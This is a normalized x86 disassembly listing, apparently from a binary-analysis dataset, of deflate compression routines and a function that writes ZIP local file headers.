call sub_403810
add esp 0xc
mov eax ebp
shr eax 0x7
mov al [ eax + esi + 0x1d3d ]
mov al [ esi + ebp + 0x1c3d ]
jmp r-xdata
mov eax [ esp + 0x24 ]
pop edi
pop ebp
pop ebx
mov cl [ esp + 0x13 ]
mov eax [ esi + 0x1af2c ]
shr cl 0x1
mov [ esp + 0x13 ] cl
mov ecx [ esp + 0x24 ]
cmp ecx eax
jb r-xdata
push eax
mov eax [ esi + edi * 4 + 0x1eb4 ]
sub ebp eax
push ebp
and eax 0xff
push rw-data
mov edi eax
cmp edi 0x1e
setb cl
push ecx
push esi
call sub_4023b0
xor edx edx
xor eax eax
mov dx [ ebx + edi * 4 + 0x2 ]
mov ax [ ebx + edi * 4 ]
push edx
push eax
push esi
call sub_403810
mov eax [ edi * 4 + r--data ]
add esp 0x18
test eax eax
je r-xdata
sub_403750
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
xor edi edi
xor edx edx
lea eax [ ebx + 0x14 ]
mov ecx 0x7
xor esi esi
mov si [ eax ]
add eax 0x4
add edx esi
dec ecx
jne r-xdata
push ebp
lea eax [ ebx + 0x30 ]
mov ecx 0x79
mov esi 0x80
xor ebp ebp
mov bp [ eax ]
add eax 0x4
add edi ebp
dec ecx
jne r-xdata
cmp esi 0x100
pop ebp
jge r-xdata
mov ecx [ ebx + 0x1af50 ]
shr edi 0x2
cmp edi edx
pop edi
sbb eax eax
pop esi
inc eax
pop ebx
mov [ ecx ] ax
retn
mov eax 0x100
lea ecx [ ebx + esi * 4 + 0x14 ]
sub eax esi
xor esi esi
mov si [ ecx ]
add ecx 0x4
add edx esi
dec eax
jne r-xdata
sub_4037d0
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0xc ]
mov [ eax + 0x1af60 ] ecx
mov [ eax + 0x1af68 ] edx
mov edx [ esp + 0x10 ]
xor ecx ecx
mov [ eax + 0x1af64 ] ecx
mov [ eax + 0x1af54 ] edx
mov [ eax + 0x1af58 ] ecx
mov [ eax + 0x1af5c ] ecx
mov [ eax + 0x1af6c ] ecx
retn
sub_403810
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
test ebp ebp
jle r-xdata
xor eax eax
cmp ebp 0xf
jg r-xdata
pop esi
pop ebp
pop ebx
retn
mov ecx [ esi + 0x1af68 ]
mov eax [ esi + 0x1af64 ]
push edi
lea edi [ esi + 0x1af64 ]
dec ecx
cmp eax ecx
jb r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ esi + 0x1af60 ]
mov edx [ edi ]
mov al [ esi + 0x1af58 ]
mov [ ecx + edx ] al
mov ecx [ edi ]
mov edx [ esi + 0x1af60 ]
inc ecx
mov [ edi ] ecx
mov eax ecx
xor ecx ecx
mov cl [ esi + 0x1af59 ]
mov [ edx + eax ] cl
mov eax [ edi ]
inc eax
mov ecx ebp
mov [ edi ] eax
mov edi [ esi + 0x1af5c ]
add edi 0xfffffff0
mov eax edi
mov [ esi + 0x1af5c ] edi
sub ecx eax
pop edi
shr ebx cl
mov [ esi + 0x1af58 ] ebx
mov edx [ esi + 0x1af60 ]
mov eax [ esi ]
push edi
push edx
push eax
call [ esi + 0x10 ]
add esp 0xc
mov esi [ esp + 0x10 ]
push rw-data
push eax
push esi
call sub_4023b0
mov ebx [ esi + 0x1af6c ]
mov ecx [ esi + 0x1af5c ]
add ebx ebp
mov edx [ esi + 0x1af58 ]
mov [ esi + 0x1af6c ] ebx
mov ebx [ esp + 0x20 ]
mov eax ebx
add esp 0xc
shl eax cl
or edx eax
lea eax [ ecx + ebp ]
cmp eax 0x10
mov [ esi + 0x1af58 ] edx
mov [ esi + 0x1af5c ] eax
jle r-xdata
sub_4038f0
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push esi
xor eax eax
mov esi ecx
and esi 0x1
or eax esi
shr ecx 0x1
shl eax 0x1
dec edx
test edx edx
jg r-xdata
shr eax 0x1
pop esi
retn
sub_403910
push esi
mov esi [ esp + 0x8 ]
push edi
mov eax [ esi + 0x1af5c ]
cmp eax 0x8
jle r-xdata
test eax eax
jle r-xdata
mov eax [ esi + 0x1af68 ]
mov ecx [ esi + 0x1af64 ]
lea edi [ esi + 0x1af64 ]
dec eax
cmp ecx eax
jb r-xdata
mov eax [ esi + 0x1af54 ]
test eax eax
je r-xdata
mov eax [ esi + 0x1af64 ]
mov ecx [ esi + 0x1af68 ]
lea edi [ esi + 0x1af64 ]
cmp eax ecx
jb r-xdata
mov eax [ esi + 0x1af60 ]
mov ecx [ edi ]
mov dl [ esi + 0x1af58 ]
mov [ eax + ecx ] dl
mov ecx [ edi ]
mov edx [ esi + 0x1af60 ]
inc ecx
mov [ edi ] ecx
mov eax ecx
xor ecx ecx
mov cl [ esi + 0x1af59 ]
mov [ edx + eax ] cl
jmp r-xdata
mov ecx [ esi + 0x1af60 ]
mov edx [ esi ]
push edi
push ecx
push edx
call [ esi + 0x10 ]
add esp 0xc
mov eax [ esi + 0x1af6c ]
mov [ esi + 0x1af58 ] 0x0
add eax 0x7
mov [ esi + 0x1af5c ] 0x0
and al 0xf8
pop edi
mov [ esi + 0x1af6c ] eax
pop esi
retn
mov ecx [ esi + 0x1af60 ]
mov edx [ esi ]
lea eax [ esi + 0x1af64 ]
push eax
push ecx
push edx
call [ esi + 0x10 ]
add esp 0xc
mov eax [ esi + 0x1af60 ]
mov ecx [ edi ]
mov dl [ esi + 0x1af58 ]
mov [ eax + ecx ] dl
mov ecx [ esi + 0x1af60 ]
mov edx [ esi ]
push edi
push ecx
push edx
call [ esi + 0x10 ]
add esp 0xc
inc [ edi ]
sub_403a00
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
push edi
push ebp
call sub_403910
mov eax [ esp + 0x24 ]
mov ebx [ esp + 0x20 ]
add esp 0x4
test eax eax
je r-xdata
mov eax [ ebp + 0x1af54 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1af68 ]
mov ecx [ ebp + 0x1af64 ]
lea esi [ ebp + 0x1af64 ]
dec eax
cmp ecx eax
jb r-xdata
mov eax [ ebp + 0x1af64 ]
mov edx [ ebp + 0x1af68 ]
lea ecx [ eax + ebx ]
cmp ecx edx
jbe r-xdata
mov edx [ ebp + 0x1af60 ]
mov eax [ ebp ]
lea esi [ ebp + 0x1af64 ]
push esi
push edx
push eax
call [ ebp + 0x10 ]
mov ecx [ esp + 0x24 ]
mov edx [ ebp ]
push esi
push ecx
push edx
mov [ esi ] ebx
call [ ebp + 0x10 ]
add esp 0x18
jmp r-xdata
mov eax [ ebp + 0x1af60 ]
mov ecx [ esi ]
xor edx edx
mov [ eax + ecx ] bl
mov ecx [ esi ]
inc ecx
mov dl bh
mov [ esi ] ecx
mov eax ecx
mov ecx [ ebp + 0x1af60 ]
mov [ ecx + eax ] dl
mov eax [ esi ]
mov edx [ ebp + 0x1af68 ]
inc eax
dec edx
mov [ esi ] eax
cmp eax edx
jb r-xdata
mov ecx [ ebp + 0x1af60 ]
mov edx [ ebp ]
push esi
push ecx
push edx
call [ ebp + 0x10 ]
add esp 0xc
mov edi [ ebp + 0x1af60 ]
mov esi [ esp + 0x18 ]
mov ecx ebx
add edi eax
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
add [ ebp + 0x1af64 ] ebx
push rw-data
push 0x0
push ebp
call sub_4023b0
add esp 0xc
jmp r-xdata
mov ecx [ ebp + 0x1af6c ]
lea eax [ ebx * 8 ]
add ecx eax
pop edi
mov [ ebp + 0x1af6c ] ecx
pop esi
pop ebp
pop ebx
retn
mov eax [ ebp + 0x1af60 ]
mov ecx [ esi ]
mov dl bl
not dl
mov [ eax + ecx ] dl
mov ecx [ esi ]
inc ecx
mov edx ebx
mov [ esi ] ecx
mov edi ecx
mov ecx [ ebp + 0x1af60 ]
xor eax eax
not edx
mov al dh
mov [ ecx + edi ] al
mov ecx [ esi ]
mov eax [ ebp + 0x1af6c ]
inc ecx
add eax 0x20
mov [ esi ] ecx
mov [ ebp + 0x1af6c ] eax
mov eax [ ebp + 0x1af60 ]
mov ecx [ ebp ]
push esi
push eax
push ecx
call [ ebp + 0x10 ]
add esp 0xc
sub_403b60
push ebx
mov ebx [ esp + 0xc ]
push ebp
xor ebp ebp
push esi
cmp ebx 0x1
push edi
jl r-xdata
xor eax eax
cmp ebx 0x8
jg r-xdata
mov ecx 0x7fff
xor eax eax
lea edi [ esi + 0x4af70 ]
mov [ esi + 0x6af6c ] ebp
[ edi ]
mov ax [ ebx * 8 + r--data ]
xor ecx ecx
mov [ esi + 0x6af98 ] eax
mov cx [ ebx * 8 + r--data ]
xor edx edx
mov [ esi + 0x6af9c ] ecx
mov dx [ ebx * 8 + r--data ]
xor eax eax
mov [ esi + 0x6afa0 ] edx
mov ax [ ebx * 8 + r--data ]
cmp ebx 0x2
mov [ esi + 0x6af94 ] eax
jg r-xdata
mov [ esi + 0x6af78 ] 0x1
mov [ esi + 0x6af70 ] 0x10000
mov eax 0x1
jmp r-xdata
cmp ebx 0x8
jl r-xdata
mov eax [ esp + 0x1c ]
or [ eax ] 0x4
jmp r-xdata
mov esi [ esp + 0x14 ]
push rw-data
push eax
push esi
call sub_4023b0
mov eax [ esi + 0x6af70 ]
add esp 0xc
cmp eax ebp
mov [ esi + 0x6af78 ] ebp
jne r-xdata
lea edi [ esi + 0x1af70 ]
push 0x10000
push edi
push esi
mov [ esi + 0x6af84 ] ebp
mov [ esi + 0x6af74 ] ebp
call [ esi + 0xc ]
add esp 0xc
cmp eax ebp
mov [ esi + 0x6af90 ] eax
je r-xdata
mov eax [ esp + 0x1c ]
or [ eax ] 0x2
mov [ esi + 0x6af8c ] 0x1
mov [ esi + 0x6af90 ] ebp
pop edi
pop esi
pop ebp
pop ebx
retn
cmp eax 0xffffffff
je r-xdata
cmp eax 0x106
mov [ esi + 0x6af8c ] ebp
jae r-xdata
mov [ esi + 0x6af7c ] ebp
xor eax eax
push esi
call sub_403eb0
add esp 0x4
mov edx [ esi + 0x6af7c ]
xor ecx ecx
mov cl [ edi + eax ]
and edx 0x3ff
and ecx 0x7fff
shl edx 0x5
xor ecx edx
inc eax
cmp eax 0x2
mov [ esi + 0x6af7c ] ecx
jb r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
sub_403cb0
sub esp 0x10
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x24 ]
mov eax [ edi + 0x6af94 ]
mov ebp [ edi + 0x6af80 ]
mov [ esp + 0x14 ] eax
mov eax [ edi + 0x6af84 ]
cmp eax 0x7efa
lea esi [ eax + edi + 0x1af70 ]
jbe r-xdata
mov [ esp + 0x1c ] 0x0
add eax 0xffff8106
mov [ esp + 0x1c ] eax
jmp r-xdata
mov ecx [ edi + 0x6af70 ]
push rw-data
sub ecx 0x106
cmp eax ecx
setbe dl
push edx
push edi
call sub_4023b0
mov ebx [ esp + 0x34 ]
add esp 0xc
shr [ esp + 0x14 ] 0x2
push rw-data
push 0x1
push edi
call sub_4023b0
mov eax [ edi + 0x6af84 ]
mov dl [ esi + ebp - 0x1 ]
mov [ esp + 0x30 ] dl
mov edx [ edi + 0x6af80 ]
lea ecx [ eax + edi + 0x1b072 ]
add esp 0xc
mov [ esp + 0x18 ] ecx
mov cl [ esi + ebp ]
mov [ esp + 0x13 ] cl
mov ecx [ edi + 0x6af9c ]
cmp edx ecx
jb r-xdata
mov eax [ esp + 0x1c ]
and ebx 0x7fff
mov ebx [ edi + ebx * 4 + 0x2af70 ]
cmp ebx eax
jbe r-xdata
mov dl [ esp + 0x24 ]
mov cl [ eax + ebp - 0x1 ]
cmp cl dl
jne r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x14 ]
dec eax
mov [ esp + 0x14 ] eax
jne r-xdata
mov cl [ eax ]
mov dl [ esi ]
cmp cl dl
jne r-xdata
mov eax [ edi + 0x6af84 ]
push rw-data
cmp ebx eax
setb al
push eax
push edi
call sub_4023b0
mov cl [ esp + 0x1f ]
lea eax [ edi + ebx + 0x1af70 ]
add esp 0xc
cmp [ eax + ebp ] cl
jne r-xdata
mov dl [ eax + 0x1 ]
mov cl [ esi + 0x1 ]
inc eax
cmp dl cl
jne r-xdata
add esi 0x2
inc eax
mov eax [ edi + 0x6af70 ]
push rw-data
lea ecx [ eax + edi + 0x1af6f ]
cmp esi ecx
setbe dl
push edx
push edi
call sub_4023b0
mov ecx [ esp + 0x24 ]
mov eax esi
sub eax ecx
add esp 0xc
add eax 0x102
lea esi [ ecx - 0x102 ]
cmp eax ebp
jle r-xdata
mov dl [ esi + 0x1 ]
mov cl [ eax + 0x1 ]
inc esi
inc eax
cmp dl cl
jne r-xdata
mov ecx [ edi + 0x6afa0 ]
mov [ edi + 0x6af88 ] ebx
cmp eax ecx
mov ebp eax
jge r-xdata
mov cl [ esi + 0x1 ]
mov dl [ eax + 0x1 ]
inc esi
inc eax
cmp cl dl
jne r-xdata
mov cl [ eax + esi - 0x1 ]
mov dl [ eax + esi ]
mov [ esp + 0x24 ] cl
mov [ esp + 0x13 ] dl
mov dl [ esi + 0x1 ]
mov cl [ eax + 0x1 ]
inc esi
inc eax
cmp dl cl
jne r-xdata
mov cl [ esi + 0x1 ]
mov dl [ eax + 0x1 ]
inc esi
inc eax
cmp cl dl
jne r-xdata
mov dl [ esi + 0x1 ]
mov cl [ eax + 0x1 ]
inc esi
inc eax
cmp dl cl
jne r-xdata
mov cl [ esi + 0x1 ]
mov dl [ eax + 0x1 ]
inc esi
inc eax
cmp cl dl
jne r-xdata
mov dl [ esi + 0x1 ]
mov cl [ eax + 0x1 ]
inc esi
inc eax
cmp dl cl
jne r-xdata
cmp esi [ esp + 0x18 ]
jb r-xdata
mov cl [ esi + 0x1 ]
mov dl [ eax + 0x1 ]
inc esi
inc eax
cmp cl dl
jne r-xdata
sub_403eb0
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
push edi
cmp eax 0xfefa
jb r-xdata
mov ebp 0xfffffffe
jmp r-xdata
mov eax [ ebx + 0x6af8c ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x6af78 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
cmp ebp 0x2
push rw-data
setae al
push eax
push ebx
call sub_4023b0
mov ecx [ ebx + 0x6af84 ]
mov edx [ ebx + 0x6af90 ]
add ecx ebx
push ebp
lea eax [ ecx + edx + 0x1af70 ]
push eax
push ebx
call [ ebx + 0xc ]
add esp 0x18
test eax eax
je r-xdata
mov ecx 0x2000
lea esi [ ebx + 0x22f70 ]
lea edi [ ebx + 0x1af70 ]
mov eax 0xffff8000
[ edi ] [ esi ]
mov esi [ ebx + 0x6af88 ]
mov edx [ ebx + 0x6af84 ]
mov ecx [ ebx + 0x6af74 ]
add esi eax
add edx eax
add ecx eax
mov [ ebx + 0x6af84 ] edx
mov [ ebx + 0x6af88 ] esi
mov [ ebx + 0x6af74 ] ecx
lea eax [ ebx + 0x4af70 ]
mov edx 0x8000
mov [ ebx + 0x6af8c ] 0x1
cmp eax 0xffffffff
je r-xdata
xor ecx ecx
add ecx 0xffff8000
jmp r-xdata
mov eax [ ebx + 0x6af8c ]
test eax eax
je r-xdata
add [ ebx + 0x6af90 ] eax
jmp r-xdata
mov ecx [ eax ]
cmp ecx 0x8000
jb r-xdata
lea eax [ ebx + 0x2af70 ]
mov edx 0x8000
mov [ eax ] ecx
add eax 0x4
dec edx
jne r-xdata
mov eax [ ebx + 0x6af84 ]
mov ebp [ ebx + 0x6af70 ]
mov edx [ ebx + 0x6af90 ]
sub ebp eax
sub ebp edx
cmp ebp 0xffffffff
jne r-xdata
cmp [ ebx + 0x6af90 ] 0x106
jae r-xdata
xor ecx ecx
add ecx 0xffff8000
jmp r-xdata
mov ecx [ eax ]
cmp ecx 0x8000
jb r-xdata
add ebp 0x8000
mov [ eax ] ecx
add eax 0x4
dec edx
jne r-xdata
sub_404000
push ebp
push esi
mov esi [ esp + 0xc ]
push edi
xor ebp ebp
xor edi edi
mov eax [ esi + 0x6af90 ]
mov [ esi + 0x6af80 ] 0x2
test eax eax
je r-xdata
mov eax [ esi + 0x6af74 ]
test eax eax
jl r-xdata
push ebx
xor ecx ecx
lea ecx [ eax + esi + 0x1af70 ]
jmp r-xdata
test ebp ebp
je r-xdata
mov ecx [ esi + 0x6af84 ]
mov edx [ esi + 0x6af7c ]
xor eax eax
and edx 0x3ff
mov al [ ecx + esi + 0x1af72 ]
and eax 0x7fff
shl edx 0x5
xor eax edx
and ecx 0x7fff
mov [ esi + 0x6af7c ] eax
mov ebp [ esi + eax * 4 + 0x4af70 ]
mov [ esi + ecx * 4 + 0x2af70 ] ebp
mov eax [ esi + 0x6af7c ]
mov ecx [ esi + 0x6af84 ]
mov [ esi + eax * 4 + 0x4af70 ] ecx
mov edx [ esi + 0x6af84 ]
push 0x1
sub edx eax
push edx
push ecx
push esi
call sub_403160
add esp 0x10
pop edi
pop esi
pop ebp
retn
cmp edi 0x3
jb r-xdata
mov edx [ esi + 0x6af84 ]
sub edx ebp
cmp edx 0x7efa
ja r-xdata
mov eax [ esi + 0x6af84 ]
xor ecx ecx
mov cl [ eax + esi + 0x1af70 ]
push ecx
push 0x0
push esi
call sub_4033b0
mov ecx [ esi + 0x6af90 ]
add esp 0xc
dec ecx
mov ebx eax
mov [ esi + 0x6af90 ] ecx
mov ecx [ esi + 0x6af84 ]
mov ebx [ esi + 0x6af88 ]
lea eax [ edi - 0x3 ]
sub ecx ebx
push eax
push ecx
push esi
call sub_4033b0
mov edx [ esi + 0x6af90 ]
mov ecx [ esi + 0x6af98 ]
add esp 0xc
sub edx edi
mov ebx eax
cmp edi ecx
mov [ esi + 0x6af90 ] edx
mov eax edx
ja r-xdata
mov eax [ esi + 0x6af90 ]
mov ecx [ esi + 0x6afa0 ]
cmp ecx eax
jbe r-xdata
cmp [ esi + 0x6af90 ] 0x106
jae r-xdata
mov eax [ esi + 0x6af74 ]
test eax eax
jl r-xdata
mov edx [ esi + 0x6af84 ]
xor eax eax
add edx edi
push rw-data
mov [ esi + 0x6af84 ] edx
push 0x1
mov al [ edx + esi + 0x1af70 ]
lea ecx [ edx + esi ]
xor edx edx
mov [ esi + 0x6af7c ] eax
mov dl [ ecx + 0x1af71 ]
and eax 0x3ff
and edx 0x7fff
push esi
shl eax 0x5
xor edx eax
xor edi edi
mov [ esi + 0x6af7c ] edx
call sub_4023b0
add esp 0xc
jmp r-xdata
cmp eax 0x3
jb r-xdata
push ebp
push esi
call sub_403cb0
mov edi eax
mov eax [ esi + 0x6af90 ]
add esp 0x8
cmp edi eax
jbe r-xdata
mov [ esi + 0x6afa0 ] eax
mov eax [ esi + 0x6af90 ]
test eax eax
jne r-xdata
push esi
call sub_403eb0
add esp 0x4
xor ecx ecx
lea ecx [ eax + esi + 0x1af70 ]
jmp r-xdata
test ebx ebx
je r-xdata
dec edi
mov edi eax
cmp eax 0x3
jb r-xdata
pop ebx
mov edx [ esi + 0x6af84 ]
push 0x0
sub edx eax
push edx
push ecx
push esi
call sub_403160
mov eax [ esi + 0x6af84 ]
add esp 0x10
mov [ esi + 0x6af74 ] eax
mov ebp [ esi + 0x6af84 ]
mov edx [ esi + 0x6af7c ]
inc ebp
xor eax eax
mov ecx ebp
mov [ esi + 0x6af84 ] ebp
and edx 0x3ff
mov al [ esi + ecx + 0x1af72 ]
and ecx 0x7fff
and eax 0x7fff
shl edx 0x5
xor eax edx
dec edi
mov [ esi + 0x6af7c ] eax
mov ebp [ esi + eax * 4 + 0x4af70 ]
mov [ esi + ecx * 4 + 0x2af70 ] ebp
mov eax [ esi + 0x6af7c ]
mov ecx [ esi + 0x6af84 ]
mov [ esi + eax * 4 + 0x4af70 ] ecx
jne r-xdata
jmp r-xdata
inc [ esi + 0x6af84 ]
sub_404280
push ecx
push ebx
push esi
mov esi [ esp + 0x10 ]
push edi
xor edi edi
mov ebx 0x2
mov eax [ esi + 0x4 ]
mov [ esp + 0xc ] edi
cmp eax 0x3
jg r-xdata
mov eax [ esi + 0x6af90 ]
test eax eax
je r-xdata
push esi
call sub_404000
add esp 0x4
pop edi
pop esi
pop ebx
pop ecx
retn
mov eax [ esi + 0x6af74 ]
test eax eax
jl r-xdata
push ebp
xor ecx ecx
lea ecx [ eax + esi + 0x1af70 ]
jmp r-xdata
mov ebp [ esi + 0x6af88 ]
mov [ esi + 0x6af80 ] ebx
test edi edi
mov ebx 0x2
je r-xdata
mov ecx [ esi + 0x6af84 ]
mov edx [ esi + 0x6af7c ]
xor eax eax
and edx 0x3ff
mov al [ ecx + esi + 0x1af72 ]
and eax 0x7fff
shl edx 0x5
xor eax edx
and ecx 0x7fff
mov [ esi + 0x6af7c ] eax
mov edi [ esi + eax * 4 + 0x4af70 ]
mov [ esi + ecx * 4 + 0x2af70 ] edi
mov eax [ esi + 0x6af7c ]
mov ecx [ esi + 0x6af84 ]
mov [ esi + eax * 4 + 0x4af70 ] ecx
mov edx [ esi + 0x6af84 ]
push 0x1
sub edx eax
push edx
push ecx
push esi
call sub_403160
add esp 0x10
pop edi
pop esi
pop ebx
pop ecx
retn
mov ecx [ esi + 0x6af80 ]
cmp ecx 0x3
jb r-xdata
mov edx [ esi + 0x6af80 ]
mov eax [ esi + 0x6af98 ]
cmp edx eax
jae r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
cmp ebx ecx
ja r-xdata
mov eax [ esi + 0x6af84 ]
sub eax edi
cmp eax 0x7efa
ja r-xdata
mov [ esp + 0x10 ] 0x1
mov ecx [ esi + 0x6af84 ]
xor edx edx
mov dl [ ecx + esi + 0x1af6f ]
push edx
push 0x0
push esi
call sub_4033b0
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi + 0x6af84 ]
mov edx [ esi + 0x6af90 ]
add ecx 0xfffffffd
lea ebx [ eax + edx - 0x3 ]
sub eax ebp
dec eax
push ecx
push eax
push esi
call sub_4033b0
mov ecx [ esi + 0x6af80 ]
mov edx [ esi + 0x6af90 ]
mov ebp eax
mov eax 0x1
sub eax ecx
add esp 0xc
add edx eax
add ecx 0xfffffffe
mov [ esi + 0x6af90 ] edx
mov [ esi + 0x6af80 ] ecx
mov eax [ esi + 0x6af90 ]
mov ecx [ esi + 0x6afa0 ]
cmp ecx eax
jbe r-xdata
mov eax [ esi + 0x6af90 ]
test eax eax
jne r-xdata
push esi
call sub_403eb0
add esp 0x4
mov ecx [ esi + 0x6af84 ]
mov eax [ esi + 0x6af90 ]
inc ecx
dec eax
mov [ esi + 0x6af84 ] ecx
mov [ esi + 0x6af90 ] eax
mov eax [ esi + 0x6af74 ]
test eax eax
jl r-xdata
mov eax [ esi + 0x6af80 ]
dec eax
mov [ esi + 0x6af80 ] eax
jne r-xdata
mov eax [ esi + 0x6af7c ]
xor ecx ecx
mov cl [ edx + esi + 0x1af72 ]
and eax 0x3ff
and ecx 0x7fff
shl eax 0x5
xor ecx eax
and edx 0x7fff
mov [ esi + 0x6af7c ] ecx
mov edi [ esi + ecx * 4 + 0x4af70 ]
mov [ esi + edx * 4 + 0x2af70 ] edi
mov ecx [ esi + 0x6af7c ]
mov edx [ esi + 0x6af84 ]
mov [ esi + ecx * 4 + 0x4af70 ] edx
push edi
push esi
call sub_403cb0
mov ebx eax
mov eax [ esi + 0x6af90 ]
add esp 0x8
cmp ebx eax
jbe r-xdata
mov [ esi + 0x6afa0 ] eax
cmp eax 0x3
jb r-xdata
mov eax [ esp + 0x10 ]
pop ebp
test eax eax
je r-xdata
xor ecx ecx
lea ecx [ eax + esi + 0x1af70 ]
jmp r-xdata
mov ecx [ esi + 0x6af84 ]
inc ecx
mov edx ecx
mov [ esi + 0x6af84 ] ecx
cmp edx ebx
ja r-xdata
mov ecx [ esi + 0x6af84 ]
mov [ esp + 0x10 ] 0x0
inc ecx
mov ebx 0x2
test ebp ebp
mov [ esi + 0x6af84 ] ecx
je r-xdata
cmp ebx 0x3
jne r-xdata
mov ebx eax
mov ecx [ esi + 0x6af84 ]
xor edx edx
mov dl [ ecx + esi + 0x1af6f ]
push edx
push 0x0
push esi
call sub_4033b0
add esp 0xc
mov edx [ esi + 0x6af84 ]
push 0x0
sub edx eax
push edx
push ecx
push esi
call sub_403160
mov eax [ esi + 0x6af84 ]
add esp 0x10
mov [ esi + 0x6af74 ] eax
jmp r-xdata
cmp [ esi + 0x6af90 ] 0x106
jae r-xdata
mov eax [ esi + 0x6af74 ]
test eax eax
jl r-xdata
mov ecx [ esi + 0x6af84 ]
mov edx [ esi + 0x6af88 ]
sub ecx edx
cmp ecx 0x1000
jbe r-xdata
xor edx edx
lea edx [ eax + esi + 0x1af70 ]
jmp r-xdata
mov ebx 0x2
sub ecx eax
push 0x0
push ecx
push edx
push esi
call sub_403160
mov eax [ esi + 0x6af84 ]
add esp 0x10
mov [ esi + 0x6af74 ] eax
jmp r-xdata
sub_4045b0
push ecx
push ebx
push esi
mov esi [ esp + 0x18 ]
push edi
mov edi [ esp + 0x18 ]
lea eax [ esp + 0xf ]
push 0x1
push eax
push esi
mov [ esp + 0x1b ] 0x50
call edi
lea ecx [ esp + 0x1b ]
push 0x1
push ecx
push esi
mov [ esp + 0x27 ] 0x4b
call edi
lea edx [ esp + 0x34 ]
push 0x1
push edx
push esi
mov [ esp + 0x40 ] 0x3
call edi
lea eax [ esp + 0x40 ]
push 0x1
push eax
push esi
mov [ esp + 0x4c ] 0x4
call edi
mov ebx [ esp + 0x44 ]
lea edx [ esp + 0x4c ]
push 0x1
push edx
mov cl [ ebx + 0x2 ]
push esi
mov [ esp + 0x58 ] cl
call edi
xor eax eax
lea ecx [ esp + 0x58 ]
mov al [ ebx + 0x3 ]
push 0x1
push ecx
push esi
mov [ esp + 0x64 ] al
call edi
mov dl [ ebx + 0x2c ]
add esp 0x48
lea eax [ esp + 0x1c ]
mov [ esp + 0x1c ] dl
push 0x1
push eax
push esi
call edi
xor ecx ecx
lea edx [ esp + 0x28 ]
mov cl [ ebx + 0x2d ]
push 0x1
push edx
push esi
mov [ esp + 0x34 ] cl
call edi
mov al [ ebx + 0x6 ]
lea ecx [ esp + 0x34 ]
push 0x1
push ecx
push esi
mov [ esp + 0x40 ] al
call edi
xor edx edx
lea eax [ esp + 0x40 ]
mov dl [ ebx + 0x7 ]
push 0x1
push eax
push esi
mov [ esp + 0x4c ] dl
call edi
mov cl [ ebx + 0x8 ]
lea edx [ esp + 0x4c ]
push 0x1
mov [ esp + 0x50 ] cl
push edx
push esi
call edi
mov eax [ ebx + 0x8 ]
lea ecx [ esp + 0x58 ]
push 0x1
push ecx
shr eax 0x8
push esi
mov [ esp + 0x64 ] al
call edi
mov edx [ ebx + 0x8 ]
add esp 0x48
lea eax [ esp + 0x1c ]
push 0x1
push eax
shr edx 0x10
push esi
mov [ esp + 0x28 ] dl
call edi
mov ecx [ ebx + 0x8 ]
lea edx [ esp + 0x28 ]
push 0x1
push edx
shr ecx 0x18
push esi
mov [ esp + 0x34 ] cl
call edi
mov al [ ebx + 0xc ]
lea ecx [ esp + 0x34 ]
push 0x1
push ecx
push esi
mov [ esp + 0x40 ] al
call edi
mov edx [ ebx + 0xc ]
lea eax [ esp + 0x40 ]
push 0x1
push eax
shr edx 0x8
push esi
mov [ esp + 0x4c ] dl
call edi
mov ecx [ ebx + 0xc ]
lea edx [ esp + 0x4c ]
push 0x1
push edx
shr ecx 0x10
push esi
mov [ esp + 0x58 ] cl
call edi
mov eax [ ebx + 0xc ]
lea ecx [ esp + 0x58 ]
push 0x1
push ecx
shr eax 0x18
push esi
mov [ esp + 0x64 ] al
call edi
mov dl [ ebx + 0x10 ]
add esp 0x48
lea eax [ esp + 0x1c ]
mov [ esp + 0x1c ] dl
push 0x1
push eax
push esi
call edi
mov ecx [ ebx + 0x10 ]
lea edx [ esp + 0x28 ]
push 0x1
push edx
shr ecx 0x8
push esi
mov [ esp + 0x34 ] cl
call edi
mov eax [ ebx + 0x10 ]
lea ecx [ esp + 0x34 ]
shr eax 0x10
push 0x1
push ecx
mov [ esp + 0x3c ] al
push esi
call edi
mov edx [ ebx + 0x10 ]
lea eax [ esp + 0x40 ]
push 0x1
push eax
shr edx 0x18
push esi
mov [ esp + 0x4c ] dl
call edi
mov cl [ ebx + 0x14 ]
lea edx [ esp + 0x4c ]
push 0x1
push edx
push esi
mov [ esp + 0x58 ] cl
call edi
mov eax [ ebx + 0x14 ]
lea ecx [ esp + 0x58 ]
push 0x1
push ecx
shr eax 0x8
push esi
mov [ esp + 0x64 ] al
call edi
mov edx [ ebx + 0x14 ]
add esp 0x48
lea eax [ esp + 0x1c ]
push 0x1
push eax
shr edx 0x10
push esi
mov [ esp + 0x28 ] dl
call edi
mov ecx [ ebx + 0x14 ]
lea edx [ esp + 0x28 ]
push 0x1
push edx
shr ecx 0x18
push esi
mov [ esp + 0x34 ] cl
call edi
mov al [ ebx + 0x18 ]
lea ecx [ esp + 0x34 ]
push 0x1
push ecx
push esi
mov [ esp + 0x40 ] al
call edi
mov edx [ ebx + 0x18 ]
lea eax [ esp + 0x40 ]
push 0x1
push eax
shr edx 0x8
push esi
mov [ esp + 0x4c ] dl
call edi
mov cl [ ebx + 0x1c ]
lea edx [ esp + 0x4c ]
push 0x1
push edx
push esi
mov [ esp + 0x58 ] cl
call edi
mov eax [ ebx + 0x1c ]
lea ecx [ esp + 0x58 ]
push 0x1
push ecx
shr eax 0x8
push esi
mov [ esp + 0x64 ] al
call edi
mov edx [ ebx + 0x18 ]
add esp 0x48
lea eax [ ebx + 0x148 ]
push edx
push eax
push esi
call edi
mov ecx [ ebx + 0x18 ]
add esp 0xc
cmp eax ecx
